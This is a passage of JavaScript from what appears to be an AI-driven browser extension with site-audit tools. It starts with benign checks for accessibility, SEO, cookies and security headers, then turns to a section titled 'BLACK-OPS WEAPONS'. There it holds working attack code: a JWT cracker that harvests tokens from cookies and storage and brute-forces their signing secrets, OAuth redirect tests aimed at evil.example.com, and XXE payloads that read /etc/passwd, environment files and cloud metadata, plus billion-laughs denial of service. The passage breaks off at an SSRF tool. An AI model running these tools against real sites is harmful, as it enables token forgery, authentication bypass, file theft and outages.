          .slice(0, 10);
        return { confirmed, found: found.slice(0, 15), balanceCandidates, target: targetStr };
      },
      args: [targetValue],
    });
    const confirmed = result?.confirmed || false;
    const balanceCandidates = result?.balanceCandidates || [];
    const allFound = result?.found || [];
    const msg = confirmed
      ? `✅ DOM CONFIRMED: "${targetValue}" is visible on screen. Balance elements: ${balanceCandidates.join(' | ') || '(matched in general text)'}`
      : `❌ DOM NOT CONFIRMED: "${targetValue}" not visible. Balance-area values: ${balanceCandidates.join(' | ') || '(none found)'} | Sample DOM text: ${allFound.slice(0, 5).join(' | ')}`;
    termWrite(confirmed ? 'final' : 'error', `[DOM-CHECK] ${msg}`);
    securityFindings.push({ type: 'dom-check-balance', summary: msg, raw: result });
    return msg;
  },

  // ── NEW v3.3.0 TOOLS ──────────────────────────────────────────────
  a11y_scan: async () => {
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: () => {
        const issues = [];
        // Images missing alt
        document.querySelectorAll('img').forEach(img => {
          if (!img.hasAttribute('alt')) issues.push({ rule: 'img-alt', selector: img.outerHTML.slice(0, 80), severity: 'error' });
        });
        // Inputs missing label
        document.querySelectorAll('input,select,textarea').forEach(el => {
          const id = el.id;
          if (!id || !document.querySelector('label[for="' + id + '"]')) {
            issues.push({ rule: 'form-label', selector: el.outerHTML.slice(0, 80), severity: 'error' });
          }
        });
        // Buttons with no text
        document.querySelectorAll('button').forEach(btn => {
          if (!btn.textContent.trim() && !btn.getAttribute('aria-label')) {
            issues.push({ rule: 'button-name', selector: btn.outerHTML.slice(0, 80), severity: 'error' });
          }
        });
        // html lang
        if (!document.documentElement.lang) issues.push({ rule: 'html-lang', selector: '<html>', severity: 'error' });
        // Multiple h1s
        const h1s = document.querySelectorAll('h1');
        if (h1s.length > 1) issues.push({ rule: 'multiple-h1', selector: h1s.length + ' h1 elements', severity: 'warn' });
        // target=_blank rel
        document.querySelectorAll('a[target="_blank"]').forEach(a => {
          if (!a.rel || !a.rel.includes('noopener')) {
            issues.push({ rule: 'target-blank-rel', selector: a.href, severity: 'warn' });
          }
        });
        return issues;
      },
    });
    const out = result || [];
    const summary = 'a11y: ' + out.filter(x => x.severity === 'error').length + ' errors, ' + out.filter(x => x.severity === 'warn').length + ' warnings';
    securityFindings.push({ type: 'a11y', summary, raw: out });
    termWrite('info', summary);
    return out;
  },

  perf_budget: async () => {
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: () => {
        const nav = performance.getEntriesByType('navigation')[0] || {};
        const resources = performance.getEntriesByType('resource');
        const topHeavy = resources.slice().sort((a, b) => b.transferSize - a.transferSize).slice(0, 5)
          .map(r => ({ name: r.name.split('/').pop().slice(0, 60), size: r.transferSize, duration: Math.round(r.duration) }));
        const longTasks = (window.__ltCount || 0);
        const heap = performance.memory ? Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB' : 'n/a';
        return {
          ttfb: Math.round(nav.responseStart - nav.requestStart),
          dcl: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart),
          load: Math.round(nav.loadEventEnd - nav.fetchStart),
          resources: resources.length,
          topHeavy,
          longTasks,
          heap,
        };
      },
    });
    const out = result || {};
    const summary = 'perf: TTFB ' + out.ttfb + 'ms, DCL ' + out.dcl + 'ms, ' + out.resources + ' resources';
    termWrite('info', summary);
    return out;
  },

  seo_audit: async () => {
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: () => {
        const meta = n => { const el = document.querySelector('meta[name="' + n + '"]'); return el ? el.content : null; };
        const prop = n => { const el = document.querySelector('meta[property="' + n + '"]'); return el ? el.content : null; };
        const issues = [];
        const title = document.title;
        if (!title) issues.push('missing <title>');
        else if (title.length > 60) issues.push('title too long (' + title.length + ' chars)');
        const desc = meta('description');
        if (!desc) issues.push('missing meta description');
        else if (desc.length > 160) issues.push('description too long');
        if (!meta('viewport')) issues.push('missing viewport meta');
        const robots = meta('robots') || '';
        if (robots.includes('noindex')) issues.push('noindex detected');
        const canonical = document.querySelector('link[rel="canonical"]');
        if (!canonical) issues.push('missing canonical link');
        if (!document.documentElement.lang) issues.push('missing lang attribute');
        const h1s = document.querySelectorAll('h1');
        if (h1s.length === 0) issues.push('no h1 tag');
        else if (h1s.length > 1) issues.push('multiple h1 tags (' + h1s.length + ')');
        const jsonld = document.querySelector('script[type="application/ld+json"]');
        return { title, description: desc, canonical: canonical ? canonical.href : null, og_title: prop('og:title'), og_image: prop('og:image'), twitter_card: meta('twitter:card'), issues };
      },
    });
    const out = result || {};
    const summary = 'seo: ' + (out.issues || []).length + ' issues — ' + (out.issues || []).slice(0, 3).join('; ');
    securityFindings.push({ type: 'seo', summary, raw: out });
    termWrite('info', summary);
    return out;
  },

  cookie_compliance: async () => {
    const { id } = await getActiveTab();
    const tabUrl = (await getActiveTab()).url || '';
    const host = tabUrl ? new URL(tabUrl).hostname : '';
    const allCookies = await chrome.cookies.getAll({ url: tabUrl || undefined });
    const issues = [];
    const details = allCookies.map(c => {
      const flags = [];
      if (!c.secure) { flags.push('MISSING Secure'); issues.push(c.name + ': no Secure flag'); }
      if (!c.httpOnly) flags.push('MISSING HttpOnly');
      if (!c.sameSite || c.sameSite === 'no_restriction') { flags.push('SameSite=None'); issues.push(c.name + ': SameSite=None'); }
      const thirtyYears = 30 * 365 * 24 * 3600;
      if (c.expirationDate && c.expirationDate - Date.now() / 1000 > thirtyYears) { flags.push('lifetime >1yr'); issues.push(c.name + ': lifetime >1 year'); }
      const thirdParty = host && !c.domain.includes(host.split('.').slice(-2).join('.'));
      if (thirdParty) { flags.push('THIRD-PARTY'); issues.push(c.name + ': third-party cookie'); }
      return { name: c.name, domain: c.domain, secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite, flags };
    });
    const summary = 'cookies: ' + allCookies.length + ' total, ' + issues.length + ' compliance issues';
    securityFindings.push({ type: 'cookie-compliance', summary, raw: { cookies: details, issues } });
    termWrite('info', summary);
    return { cookies: details, issues };
  },

  link_health: async () => {
    const { id } = await getActiveTab();
    const [{ result: links }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: () => {
        const hrefs = [...new Set([...document.querySelectorAll('a[href]')].map(a => a.href).filter(h => h.startsWith('http')))].slice(0, 60);
        const imgs = [...new Set([...document.querySelectorAll('img[src]')].map(i => i.src).filter(s => s.startsWith('http')))].slice(0, 40);
        return { hrefs, imgs };
      },
    });
    const all = [...(links.hrefs || []), ...(links.imgs || [])];
    const CONCURRENCY = 6;
    const broken = [], slow = [], ok = [];
    const check = async url => {
      const t0 = Date.now();
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url, method: 'HEAD', credentials: 'omit' } });
        const ms = Date.now() - t0;
        const st = r.data && r.data.status;
        if (st >= 400) broken.push({ url, status: st });
        else if (ms > 3000) slow.push({ url, ms });
        else ok.push(url);
      } catch { broken.push({ url, status: 'error' }); }
    };
    for (let i = 0; i < all.length; i += CONCURRENCY) {
      await Promise.all(all.slice(i, i + CONCURRENCY).map(check));
    }
    const summary = 'links: ' + broken.length + ' broken, ' + slow.length + ' slow, ' + ok.length + ' ok (checked ' + all.length + ')';
    securityFindings.push({ type: 'link-health', summary, raw: { broken, slow } });
    termWrite('info', summary);
    return { broken, slow, ok: ok.length };
  },

  csp_recommend: async () => {
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: () => {
        const origins = s => [...new Set([...document.querySelectorAll(s)].map(el => {
          try { const u = new URL(el.src || el.href || ''); return u.origin; } catch { return null; }
        }).filter(Boolean))];
        return {
          scripts: origins('script[src]'),
          styles: origins('link[rel="stylesheet"]'),
          imgs: origins('img[src]'),
          fonts: origins('link[rel*="font"]'),
          frames: origins('iframe[src]'),
          connects: [] /* can't easily enumerate fetch targets from DOM */,
        };
      },
    });
    const r = result || {};
    const parts = ["default-src 'self'"];
    if (r.scripts && r.scripts.length) parts.push("script-src 'self' 'nonce-REPLACE' " + r.scripts.join(' '));
    else parts.push("script-src 'self' 'nonce-REPLACE'");
    if (r.styles && r.styles.length) parts.push("style-src 'self' " + r.styles.join(' '));
    else parts.push("style-src 'self'");
    if (r.imgs && r.imgs.length) parts.push('img-src \'self\' data: ' + r.imgs.join(' '));
    else parts.push("img-src 'self' data:");
    if (r.fonts && r.fonts.length) parts.push('font-src \'self\' ' + r.fonts.join(' '));
    if (r.frames && r.frames.length) parts.push('frame-src ' + r.frames.join(' '));
    else parts.push("frame-src 'none'");
    parts.push("object-src 'none'");
    parts.push("base-uri 'self'");
    parts.push("form-action 'self'");
    const csp = 'Content-Security-Policy: ' + parts.join('; ');
    termWrite('info', 'CSP recommendation built (' + parts.length + ' directives)');
    return csp;
  },

  schedule_scan: async (params = {}) => {
    const interval = parseFloat(params.intervalMinutes || 60);
    const goal = params.goal || 'Run a quick security audit on this site: read hidden state, find tokens, list forms, then triage.';
    const url = params.url || activeTabUrl;
    if (!url) return 'no URL to scan';
    await chrome.storage.local.set({ scheduledScan: { url, goal, interval, lastRun: 0 } });
    await chrome.alarms.create('aiUiDoctorScan', { periodInMinutes: interval, delayInMinutes: 1 });
    securityFindings.push({ type: 'scheduled', summary: `Scheduled scan of ${url} every ${interval} min`, raw: { url, goal, interval } });
    return `scheduled every ${interval} min`;
  },

  schedule_cancel: async () => {
    await chrome.alarms.clear('aiUiDoctorScan');
    await chrome.storage.local.remove('scheduledScan');
    return 'scheduled scan cancelled';
  },

  tls_audit: async (params = {}) => {
    const target = params.url || activeTabUrl;
    if (!target) throw new Error('no target url');
    const u = new URL(target);
    const findings = [];
    const isHttps = u.protocol === 'https:';
    findings.push((isHttps ? '✓' : '✗') + ' protocol = ' + u.protocol);
    let httpRedirects = 'unknown';
    try {
      const httpUrl = 'http://' + u.host + u.pathname;
      const r = await bg({ type: 'RUN_FETCH', params: { url: httpUrl, method: 'HEAD', credentials: 'omit' } });
      if (r.data) {
        const loc = (r.data.headers || {})['location'] || '';
        httpRedirects = loc.startsWith('https://') ? 'YES → ' + loc : 'NO (status ' + r.data.status + ')';
        findings.push((loc.startsWith('https://') ? '✓' : '✗') + ' http→https redirect: ' + httpRedirects);
      }
    } catch (e) { findings.push('? http probe failed: ' + e.message); }
    try {
      const r = await bg({ type: 'RUN_FETCH', params: { url: target, method: 'HEAD', credentials: 'omit' } });
      const h = (r.data && r.data.headers) || {};
      const hsts = h['strict-transport-security'];
      if (hsts) {
        const m = /max-age=(\d+)/i.exec(hsts);
        const age = m ? parseInt(m[1], 10) : 0;
        findings.push((age >= 31536000 ? '✓' : '✗') + ' HSTS: ' + hsts + (age && age < 31536000 ? ' (max-age too short, want ≥1 year)' : ''));
        findings.push((/includesubdomains/i.test(hsts) ? '✓' : '✗') + ' HSTS includeSubDomains');
        findings.push((/preload/i.test(hsts) ? '✓' : '✗') + ' HSTS preload');
      } else {
        findings.push('✗ HSTS header missing');
      }
    } catch (e) { findings.push('? HSTS probe failed: ' + e.message); }
    securityFindings.push({ type: 'tls-audit', summary: findings.length + ' TLS findings', raw: { target, findings } });
    return findings.join(' | ');
  },

  clickjacking_test: async (params = {}) => {
    const target = params.url || activeTabUrl;
    if (!target) throw new Error('no target url');
    const findings = [];
    try {
      const r = await bg({ type: 'RUN_FETCH', params: { url: target, method: 'GET', credentials: 'omit' } });
      const h = (r.data && r.data.headers) || {};
      const xfo = h['x-frame-options'];
      const csp = h['content-security-policy'] || '';
      const fa = (csp.match(/frame-ancestors[^;]*/i) || [''])[0];
      if (xfo) findings.push('✓ X-Frame-Options: ' + xfo);
      else findings.push('✗ X-Frame-Options missing');
      if (fa) findings.push('✓ CSP frame-ancestors: ' + fa);
      else findings.push('✗ CSP frame-ancestors missing');
      const vulnerable = !xfo && !fa;
      findings.push(vulnerable ? '🚨 VULNERABLE — page can be embedded by any site (clickjacking risk)' : '✓ Embedding blocked');
      try {
        const { id } = await getActiveTab();
        await chrome.scripting.executeScript({
          target: { tabId: id }, world: 'MAIN',
          func: (u) => {
            try {
              const ifr = document.createElement('iframe');
              ifr.src = u; ifr.style.cssText = 'position:fixed;left:-9999px;width:300px;height:200px';
              ifr.id = '__cj_probe';
              document.body.appendChild(ifr);
              setTimeout(() => { try { document.getElementById('__cj_probe')?.remove(); } catch {} }, 1500);
            } catch {}
          },
          args: [target],
        });
        findings.push('ℹ Test iframe injected briefly (check page console for refusal)');
      } catch {}
    } catch (e) { findings.push('? probe failed: ' + e.message); }
    securityFindings.push({ type: 'clickjacking', summary: findings.join(' | '), raw: { target, findings } });
    return findings.join(' | ');
  },

  security_headers_check: async (params = {}) => {
    const target = params.url || activeTabUrl;
    if (!target) throw new Error('no target url');
    const wanted = {
      'strict-transport-security': 'HSTS — forces HTTPS',
      'content-security-policy': 'CSP — XSS / injection defense',
      'x-frame-options': 'Clickjacking defense',
      'x-content-type-options': 'MIME-sniff defense (want: nosniff)',
      'referrer-policy': 'Privacy — controls Referer leakage',
      'permissions-policy': 'Disables risky browser features',
      'cross-origin-opener-policy': 'COOP — process isolation',
      'cross-origin-resource-policy': 'CORP — resource isolation',
      'cross-origin-embedder-policy': 'COEP — embed isolation',
    };
    const leaky = ['server', 'x-powered-by', 'x-aspnet-version', 'x-aspnetmvc-version', 'x-generator', 'via'];
    const findings = [];
    let score = 0, max = Object.keys(wanted).length;
    try {
      const r = await bg({ type: 'RUN_FETCH', params: { url: target, method: 'GET', credentials: 'omit' } });
      const h = (r.data && r.data.headers) || {};
      for (const [k, desc] of Object.entries(wanted)) {
        if (h[k]) { findings.push('✓ ' + k + ': ' + String(h[k]).slice(0, 80) + ' — ' + desc); score++; }
        else findings.push('✗ MISSING ' + k + ' — ' + desc);
      }
      for (const k of leaky) {
        if (h[k]) findings.push('⚠ leaks ' + k + ': ' + String(h[k]).slice(0, 80));
      }
      findings.unshift('Score: ' + score + '/' + max);
    } catch (e) { findings.push('? probe failed: ' + e.message); }
    securityFindings.push({ type: 'sec-headers', summary: 'Security headers ' + score + '/' + max, raw: { target, findings } });
    return findings.join(' | ');
  },

  // === 5 NEW BLACK-OPS WEAPONS (v3.4.0) ===

  jwt_cracker: async (params = {}) => {
    const tab = await getActiveTab();
    const state = await send(tab.id, { type: 'EXTRACT_HIDDEN_STATE' }).catch(() => ({ data: { localStorage: {}, sessionStorage: {}, hiddenInputs: [] } }));
    const cookiesRes = await bg({ type: 'GET_COOKIES', url: activeTabUrl || 'http://localhost' }).catch(() => ({ cookies: [] }));
    const cookieStore = {}; cookiesRes.cookies.forEach(c => cookieStore[c.name] = c.value);
    const allStorage = { ...cookieStore, ...(state.data.localStorage || {}), ...(state.data.sessionStorage || {}) };
    const jwts = [];
    for (const [k, v] of Object.entries(allStorage)) {
      if (typeof v === 'string' && /^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(v.trim())) {
        jwts.push({ key: k, token: v.trim() });
      }
    }
    if (!jwts.length) return 'no JWTs found — run find_tokens first or check storage';
    const SECRETS = [
      '', 'secret', 'password', '123456', 'admin', 'test', 'development', 'production',
      'key', 'jwt', 'jwtkey', 'jwt_secret', 'JWT_SECRET', 'secret_key', 'secretkey',
      'mysecret', 'mykey', 'hello', 'world', 'token', 'access_token', 'auth_token',
      'qwerty', '12345678', 'password123', 'changeme', 'default', 'supersecret',
      'your-256-bit-secret', 'your-secret-key', 'your-secret', 'secretsecret',
      '1234567890', 'abcdefghij', 'HS256Key', 'HS512Key', 'super-secret', 'very-secret',
      'app_secret', 'APP_SECRET', 'app-secret', 'server_secret', 'jwt-secret', 'JWT-SECRET',
      'api_secret', 'API_SECRET', 'session_secret', 'SESSION_SECRET', 'cookie_secret',
      'private_key', 'PRIVATE_KEY', 'signing_key', 'SIGNING_KEY', 'shared_secret',
      'company', 'website', 'service', 'platform', 'application', 'dev', 'staging', 'prod',
      'Admin123', 'Password1', 'Passw0rd', 'Secret123', 'Welcome1',
      'deadbeef', 'cafebabe', '0000000000000000000000000000000000000000000000000000000000000000',
      'xxxxxxxx', 'aaaaaaaa', 'abcdefgh', 'abcdefghijklmnop', 'abcdefghijklmnopqrstuvwx',
      'none', 'null', 'undefined', 'true', 'false',
      'change_me', 'replace_me', 'your_secret_here', 'enter_secret_here',
      'keyboard cat', 'shhhhh', 'notsosecret', 'reallysecret', 'topsecret',
      'django-insecure-secret', 'flask-secret', 'rails-secret', 'laravel-secret',
      'node-secret', 'express-secret', 'spring-secret', 'dotnet-secret',
      'test1234', 'test123456', 'testing', 'testkey', 'devkey', 'devtoken',
      '000000', '111111', '222222', '999999', 'AAAAAA', 'ababab',
      'iloveyou', 'sunshine', 'monkey', 'dragon', 'baseball', 'football', 'letmein',
      'trustno1', 'master', 'login', 'pass', 'pass123', 'pass1234', 'Password',
      // === GOD MODE ADDITIONS — 80+ more common secrets ===
      'auth', 'authentication', 'authorization', 'bearer', 'token_secret', 'TOKEN_SECRET',
      'app_key', 'APP_KEY', 'application_key', 'system_secret', 'SYSTEM_SECRET',
      'hash_key', 'HASH_KEY', 'encryption_key', 'ENCRYPTION_KEY', 'cipher_key',
      'hmac_secret', 'HMAC_SECRET', 'hmac_key', 'HMAC_KEY', 'sign_key', 'SIGN_KEY',
      'public', 'private', 'internal', 'external', 'backend', 'frontend', 'middleware',
      'microservice', 'gateway', 'proxy', 'load_balancer', 'cluster', 'node', 'worker',
      'local', 'localhost', 'localdev', 'localsecret', 'devlocal', 'development_key',
      'production_key', 'prod_key', 'prod_secret', 'staging_key', 'staging_secret',
      'alpha', 'beta', 'gamma', 'delta', 'omega', 'sigma', 'zeta', 'theta',
      'openssl', 'random', 'generate', 'generated', 'auto', 'auto_generated',
      'bootstrap', 'initialize', 'init', 'setup', 'configure', 'config',
      '!@#$%^&*', 'P@ssw0rd', 'P@ssword1', 'Adm1n!', 'S3cr3t!', 'T3st!ng',
      'qazwsx', 'zxcvbn', 'asdfgh', 'qweasd', '1qaz2wsx', '1q2w3e4r',
      'abc123', 'abc123456', 'abcABC123', '123abc', 'pass@123', 'Pass@123',
      'welcome', 'welcome123', 'Welcome123', 'welcome!', 'Welcome!',
      'admin123', 'Admin123!', 'admin@123', 'administrator', 'root', 'root123',
      'toor', 'r00t', 'r00tme', 'alpine', 'docker', 'vagrant', 'ansible',
      'redis', 'mysql', 'postgres', 'postgresql', 'mongodb', 'cassandra', 'elastic',
      'rabbitmq', 'kafka', 'zookeeper', 'consul', 'vault', 'nomad', 'etcd',
      'kubernetes', 'k8s', 'helm', 'terraform', 'ansible', 'puppet', 'chef',
      'aws', 'azure', 'gcp', 'google', 'amazon', 'microsoft', 'ibm', 'oracle',
      'jwt-key-2024', 'jwt-key-2023', 'jwt-key-2022', 'secret-2024', 'secret-2023',
      'my-secret-key', 'my-jwt-secret', 'my-app-secret', 'my-api-key',
      'supersecretkey', 'ultrasecretkey', 'megasecretkey', 'absolutesecret',
      'abc', 'xyz', '123', 'aaa', 'bbb', 'ccc', 'zzz', '111', '222', '333',
      'secret1', 'secret2', 'secret3', 'key1', 'key2', 'key3', 'pass1', 'pass2',
      'p@ss', 'p@ssw0rd', 'p@55w0rd', 'p455w0rd', '5ecret', '53cr3t',
      'notasecret', 'thisisnotasecret', 'donttellanyone', 'keepitsecret',
      'opensesame', 'abracadabra', 'sesame', 'password1234', '123456789',
    ];
    const verifyJwt = async (token, secret) => {
      try {
        const parts = token.split('.');
        if (parts.length !== 3) return false;
        const data = parts[0] + '.' + parts[1];
        const sig = parts[2];
        const enc = new TextEncoder();
        const key = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
        const signedBuf = await crypto.subtle.sign('HMAC', key, enc.encode(data));
        const signed = btoa(String.fromCharCode(...new Uint8Array(signedBuf))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        return signed === sig;
      } catch { return false; }
    };
    const findings = [];
    for (const { key, token } of jwts.slice(0, 5)) {
      termWrite('running', `[JWT-CRACK] Testing ${SECRETS.length} common secrets against "${key}"…`);
      let cracked = false;
      for (const secret of SECRETS) {
        if (await verifyJwt(token, secret)) {
          findings.push(`🚨 CRACKED! Token "${key}" uses weak secret: "${secret || '(empty string)'}" — attacker can forge any JWT!`);
          termWrite('done', `[JWT-CRACK] 🚨 CRACKED! "${key}" secret="${secret || '(empty)'}" — FULL AUTH BYPASS POSSIBLE`);
          cracked = true; break;
        }
      }
      if (!cracked) findings.push(`✓ "${key}" — none of ${SECRETS.length} common secrets matched`);
    }
    const vulns = findings.filter(f => f.includes('🚨'));
    const summary = `JWT Cracker Results:\n${findings.join('\n')}`;
    if (vulns.length) securityFindings.push({ type: 'jwt-cracked', summary, raw: { tested: jwts.map(j => j.key), findings } });
    return vulns.length ? `${vulns.length} JWT(s) CRACKED with weak secret — full auth bypass possible` : `no weak JWT secrets found (${SECRETS.length} tried across ${jwts.length} token(s))`;
  },

  oauth_bypass: async (params = {}) => {
    const base = params.url || activeTabUrl;
    if (!base) return 'no url';
    const u = new URL(base);
    const origin = u.origin;
    const findings = [];
    const oauthPaths = ['/oauth/authorize', '/oauth2/authorize', '/auth/oauth', '/connect/authorize', '/v1/oauth/authorize', '/api/oauth/authorize', '/login/oauth/authorize', '/oauth/token', '/oauth2/token', '/auth/token'];
    let authEndpoint = null;
    for (const p of oauthPaths) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: origin + p, method: 'GET', credentials: 'omit' } });
        if (r.status && r.status !== 404) { authEndpoint = origin + p; findings.push(`✓ Found OAuth endpoint: ${authEndpoint} (${r.status})`); break; }
      } catch {}
    }
    if (!authEndpoint) findings.push('ℹ No OAuth endpoint at common paths — testing current page for OAuth flows');
    if (authEndpoint) {
      const evilDomain = 'https://evil.example.com/callback';
      const redirectVariants = [
        evilDomain, evilDomain + '#', evilDomain + '%23',
        'https://trusted.example.com@evil.example.com/callback',
        '/callback/../../../evil.example.com', 'https://evil.example.com%2F.trusted.com',
      ];
      for (const rUri of redirectVariants.slice(0, 3)) {
        try {
          const testUrl = authEndpoint + '?response_type=code&client_id=test&redirect_uri=' + encodeURIComponent(rUri) + '&scope=openid&state=TESTSTATE123';
          const r = await bg({ type: 'RUN_FETCH', params: { url: testUrl, method: 'GET', credentials: 'include' } });
          const loc = (r.headers || {})['location'] || '';
          if (loc.includes('evil.example.com')) findings.push(`🚨 OAUTH OPEN REDIRECT! Server redirected to attacker domain: ${loc}`);
          else if (r.status === 302 || r.status === 301) findings.push(`⚠ Redirect (${r.status}): ${loc.slice(0, 100)} — verify if evil URI was accepted`);
          else findings.push(`✓ redirect_uri variant blocked → ${r.status}`);
        } catch {}
        await new Promise(r => setTimeout(r, 150));
      }
      try {
        const r1 = await bg({ type: 'RUN_FETCH', params: { url: authEndpoint + '?response_type=code&client_id=test&state=PREDICTABLE', method: 'GET', credentials: 'omit' } });
        const r2 = await bg({ type: 'RUN_FETCH', params: { url: authEndpoint + '?response_type=code&client_id=test&state=PREDICTABLE', method: 'GET', credentials: 'omit' } });
        if (r1.status === r2.status && r1.status !== 404) findings.push('⚠ Identical state=PREDICTABLE accepted twice — state may not be validated (CSRF in OAuth flow)');
        else findings.push('✓ OAuth state validation appears active');
      } catch {}
    }
    try {
      const { id } = await getActiveTab();
      const [{ result: leaks }] = await chrome.scripting.executeScript({
        target: { tabId: id }, world: 'MAIN',
        func: () => {
          const h = window.location.hash, s = window.location.search;
          const found = [];
          if (h.includes('access_token=')) found.push('🚨 access_token EXPOSED in URL fragment (visible to browser history + Referer header)');
          if (h.includes('id_token=')) found.push('🚨 id_token EXPOSED in URL fragment');
          if (s.includes('access_token=')) found.push('🚨 access_token EXPOSED in query string (in server access logs!)');
          if (s.includes('code=') && !s.includes('state=')) found.push('🚨 auth code in URL but NO state param — CSRF attack possible');
          return found;
        }
      });
      if (leaks && leaks.length) leaks.forEach(l => findings.push(l));
    } catch {}
    const critical = findings.filter(f => f.includes('🚨'));
    const summary = `OAuth Bypass Test on ${origin}\n${findings.join('\n')}`;
    if (critical.length) securityFindings.push({ type: 'oauth-bypass', summary, raw: findings });
    return critical.length ? `${critical.length} OAuth issue(s) found — auth bypass possible` : `OAuth tested — ${findings.length} checks completed, no critical issues`;
  },

  xxe_injection: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const method = (params.method || 'POST').toUpperCase();
    const xxePayloads = [
      { name: 'Classic /etc/passwd read',    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',            detect: /root:x:|daemon:|nobody:|bin:|sys:/i },
      { name: 'Windows win.ini read',        body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><data>&xxe;</data></root>',    detect: /\[fonts\]|\[windows\]|for 16-bit/i },
      { name: 'SSRF → AWS meta-data',        body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',   detect: /ami-id|instance-id|hostname|iam|security/i },
      { name: 'SSRF → localhost',            body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',                          detect: /html|server|apache|nginx|title/i },
      { name: '/proc/self/environ',          body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',                  detect: /PATH=|HOME=|USER=|SHELL=|PWD=/i },
      { name: 'XInclude attack',             body: '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',              detect: /root:x:|daemon:|nobody:/i },
      { name: 'PHP filter base64',           body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>', detect: /[A-Za-z0-9+/=]{60,}/i },
      { name: 'OOB via parameter entity',   body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> %xxe;]><root>test</root>',                   detect: /ami-id|instance-id|hostname|iam/i },
      { name: 'Blind via error',            body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_xxe_probe_12345">]><root>&xxe;</root>',                               detect: /no such file|cannot open|failed to open|java\.io|file not found/i },
      { name: 'SSRF → GCP meta',           body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>',                detect: /project-id|instance-id|email|scopes/i },
      { name: 'Windows system.ini',        body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><root><data>&xxe;</data></root>',                        detect: /\[drivers\]|\[386enh\]|boot/i },
      { name: 'Java classpath entity',     body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///flag.jar!/flag.txt">]><root>&xxe;</root>',                                    detect: /flag|ctf|secret/i },
      { name: 'Billion laughs (DoS)',      body: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><root>&lol4;</root>', detect: /timeout|memory|heap|500/i },
      { name: 'Quadratic blowup',          body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">]><root>&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;</root>', detect: /timeout|500|memory/i },
    ];
    const findings = [];
    for (const p of xxePayloads) {
      const t0 = performance.now();
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url, method, headers: { 'Content-Type': 'application/xml', 'Accept': 'application/xml, text/xml, */*' }, body: p.body, credentials: 'include' } });
        const dt = Math.round(performance.now() - t0);
        const responseBody = r.body || '';
        if (p.detect.test(responseBody)) {
          findings.push(`🚨 XXE CONFIRMED: "${p.name}" → status ${r.status} ${dt}ms — server returned internal file contents!`);
          termWrite('done', `[XXE] 🚨 CONFIRMED: ${p.name} — CRITICAL`);
        } else if (r.status === 500 || /parse.*error|xml.*error|entity|dtd/i.test(responseBody)) {
          findings.push(`⚠ "${p.name}" → ${r.status} — XML processed (parser active, entity may be blocked): ${responseBody.slice(0, 80)}`);
        } else {
          findings.push(`✓ "${p.name}" → ${r.status} ${dt}ms (not vulnerable)`);
        }
      } catch (e) { findings.push(`✗ "${p.name}" → ${e.message}`); }
      await new Promise(r => setTimeout(r, 300));
    }
    const vulns = findings.filter(f => f.includes('🚨'));
    const summary = `XXE Injection Test on ${url} (${method})\n${findings.join('\n')}`;
    if (vulns.length) securityFindings.push({ type: 'xxe', summary, raw: findings });
    return vulns.length ? `${vulns.length} XXE vector(s) CONFIRMED — server reads internal files/SSRF!` : `no XXE confirmed — ${xxePayloads.length} vectors tested (blind XXE may still work via OOB)`;
  },

  ssrf_advanced: async (params = {}) => {
